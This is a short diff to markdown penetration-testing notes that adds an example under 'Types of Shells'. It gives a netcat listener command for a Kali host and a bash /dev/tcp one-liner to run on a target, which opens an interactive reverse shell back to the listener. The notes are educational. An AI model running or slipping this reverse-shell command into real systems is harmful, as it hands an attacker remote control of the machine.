@@ -140,4 +140,14 @@ shell (get interactive shell)
 ```
 
 ###### Types of Shells
-**Reverse Shell** - Sends a shell back to a listener port
+**Reverse Shell** - Sends a shell back to a listener port. For instance setting up a nc lisener on your local Kali host, and sending a connection back from the target host. 
+Exmaple
+Local Kali:
+```bash
+nc -lvpn 1234
+```
+Target Host:
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+```
+This will go back and start a bash shell on the local Kali host.
